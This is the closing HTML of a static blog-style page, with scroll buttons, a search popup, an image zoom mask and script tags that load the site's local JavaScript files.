
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>





    
<script src="/js/local-search.js"></script>







<div class="post-scripts">
    
        
<script src="/js/post-helper.js"></script>

        
            
<script src="/js/libs/anime.min.js"></script>

        
        
            
<script src="/js/toc.js"></script>

        
    
</div>



</body>
</html>
